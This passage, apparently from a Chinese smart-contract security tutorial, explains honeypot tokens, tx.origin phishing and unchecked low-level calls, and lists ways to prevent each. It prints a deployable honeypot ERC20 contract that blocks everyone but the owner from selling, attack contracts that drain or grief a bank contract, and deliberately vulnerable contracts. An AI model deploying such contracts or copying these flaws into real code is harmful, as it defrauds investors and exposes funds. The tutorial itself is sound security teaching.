+<li>退款时，让用户从合约自行领取（pull），而非批量发送给用户(push)</li>
+<li>确保回调函数不会影响正常合约运行</li>
+<li>确保当合约的参与者（例如 <code>owner</code>）永远缺席时，合约的主要业务仍能顺利运行</li>
+</ol>
+<h1 id="10貔貅盘">10.貔貅盘</h1>
+<p>所谓貔貅盘，指的投资人只能买不能卖，仅有项目方地址能卖出。通常一个貔貅盘的历程为：1.恶意项目方部署貔貅代币合约、2.宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高、3.项目方<code>rug pull</code>卷走资金</p>
+<h2 id="101攻击方式">10.1.攻击方式</h2>
+<p>以下是一个极简的貔貅合约，在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能</p>
+<p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p>
+<p>1.构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，这个地址会在 <code>_update()</code> 函数中用到</p>
+<p>2.mint：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币</p>
+<p>3._update：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 极简貔貅ERC20代币，只能买，不能卖
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">HoneyPot</span> <span class="k">is</span> <span class="n">ERC20</span><span class="p">,</span> <span class="n">Ownable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">pair</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;HoneyPot&#34;</span><span class="p">,</span> <span class="s">&#34;Pi Xiu&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">factory</span> <span class="o">=</span> <span class="mh">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class="p">;</span> <span class="c1">// goerli uniswap v2 factory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">tokenA</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span> <span class="c1">// 貔貅代币地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">tokenB</span> <span class="o">=</span> <span class="mh">0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6</span><span class="p">;</span> <span class="c1">//  goerli WETH
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">address</span> <span class="n">token0</span><span class="p">,</span> <span class="kt">address</span> <span class="n">token1</span><span class="p">)</span> <span class="o">=</span> <span class="n">tokenA</span> <span class="o">&lt;</span> <span class="n">tokenB</span> <span class="o">?</span> <span class="p">(</span><span class="n">tokenA</span><span class="p">,</span> <span class="n">tokenB</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="n">tokenB</span><span class="p">,</span> <span class="n">tokenA</span><span class="p">);</span> <span class="c1">//将tokenA和tokenB按大小排序
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span> <span class="n">salt</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span> <span class="n">token1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// calculate pair address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pair</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="kt">uint</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">hex&#39;ff&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">factory</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">salt</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s">hex&#39;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)))));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev See {ERC20-_update}.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 貔貅函数：只有合约拥有者可以卖出
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_update</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span> <span class="k">from</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">uint256</span> <span class="n">amount</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span> <span class="k">internal</span> <span class="k">virtual</span> <span class="k">override</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="n">to</span> <span class="o">==</span> <span class="n">pair</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="k">from</span> <span class="o">==</span> <span class="n">owner</span><span class="p">(),</span> <span class="s">&#34;Can not Transfer&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">super</span><span class="p">.</span><span class="n">_update</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="102预防方式">10.2.预防方式</h2>
+<p>1.在区块链浏览器上（比如<a href="https://etherscan.io/" target="_blank" rel="noopener noreffer">etherscan</a>）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞</p>
+<p>2.使用貔貅识别工具，比如 <a href="https://tokensniffer.com/" target="_blank" rel="noopener noreffer">Token Sniffer</a> 和 <a href="https://ave.ai/check" target="_blank" rel="noopener noreffer">Ave Check</a>，分低的话大概率是貔貅</p>
+<p>3.仔细检查项目的官网和社交媒体</p>
+<p>4.使用tenderly、phalcon分叉模拟卖出貔貅，如果失败则确定是貔貅代币</p>
+<h1 id="11txorigin钓鱼攻击">11.TxOrigin钓鱼攻击</h1>
+<p>首先要说明的是<code>solidity</code>全局属性<code>tx.origin</code>代表的是启动交易的<strong>原始地址</strong>。有的时候，它和<code>msg.sender</code>是相等的；而在有的情况下，它们是不等的，如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A</p>
+<h2 id="111攻击方式">11.1.攻击方式</h2>
+<p>攻击者正是利用<code>tx.origin</code>与<code>msg.sender</code>的不一定相等来实现攻击，如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Bank</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span><span class="c1">//记录合约的拥有者
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//在创建合约时给 owner 变量赋值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//转账ETH
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个合约的在创建时会给<code>owner</code>赋值，部署后<code>owner</code>为合约的钱包地址。然后<code>transfer</code>时会进行一个简单的权限判断，如果<code>tx.origin == owner</code>，便可以转账</p>
+<p>以下是一个攻击合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 受益者地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">hacker</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Bank合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Bank</span> <span class="n">bank</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">Bank</span> <span class="n">_bank</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//强制将address类型的_bank转换为Bank类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bank</span> <span class="o">=</span> <span class="n">Bank</span><span class="p">(</span><span class="n">_bank</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//将受益者地址赋值为部署者地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">hacker</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bank</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">hacker</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">bank</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当这个攻击合约部署的时候，传入<code>Bank</code>合约的地址，<code>bank</code>会被初始化为<code>Bank</code>的实例，<code>hacker</code>也就是当前攻击钱包的地址，也是受益人的地址。当调用<code>attack</code>函数时，也就是发起攻击，<code>bank.transfer</code>会导致<code>tx.origin</code>等于<code>owner</code>， 这时<code>Bank</code>的余额会被清零到<code>hacker</code>中，造成极大损失</p>
+<h2 id="112预防方式">11.2.预防方式</h2>
+<h3 id="1121使用msgsender代替txorigin">11.2.1.使用msg.sender代替tx.origin</h3>
+<p><code>msg.sender</code>能够获取直接调用当前合约的调用发送者地址，通过对<code>msg.sender</code>的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="1122检查txorigin--msgsender">11.2.2.检查tx.origin == msg.sender</h3>
+<p>其实和上面的判断类似</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;can&#39;t call by external contract&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="12unchecked-call">12.Unchecked Call</h1>
+<p>未检查的低级调用，主要是指的<code>solidity</code>中的<code>call</code>、<code>delegatecall</code>、<code>staticcall</code>、<code>send</code>方法。比如<code>call</code>，它既可以调用其它合约的方法，又可以转账。但出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行</p>
+<h2 id="121攻击方式">12.1.攻击方式</h2>
+<p>将之前的重入攻击合约稍微改造下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">UncheckedBank</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>    <span class="c1">// 余额mapping
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 存入ether，并更新余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 提取msg.sender的全部ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Unchecked low-level call
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">send</span><span class="p">(</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取银行合约的余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里先对账户的余额清零，<code>balanceOf[msg.sender] = 0</code>，然后使用<code>send</code>方法转账，这就是漏洞所在：<strong>没有检查 <code>send()</code> 的返回值，提款失败但余额会清零</strong></p>
+<p>以下是一个攻击合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UncheckedBank</span> <span class="k">public</span> <span class="n">bank</span><span class="p">;</span> <span class="c1">// Bank合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 初始化Bank合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">UncheckedBank</span> <span class="n">_bank</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span> <span class="o">=</span> <span class="n">_bank</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 回调函数，转账ETH时会失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">revert</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 存款函数，调用时 msg.value 设为存款数量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 取款函数，虽然调用成功，但实际上取款失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取本合约的余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>receive</code>函数中直接进行了<code>revert</code>，这样交易将会回滚，该攻击合约无法接收<code>ETH</code>，但是在<code>Bank</code>合约里用户的余额却清零，造成了用户的损失</p>
+<h2 id="122预防方式">12.2.预防方式</h2>
+<h3 id="1221检查低级调用的返回值">12.2.1.检查低级调用的返回值</h3>
+<p>比如在上面的银行合约中，增加对返回值的校验</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
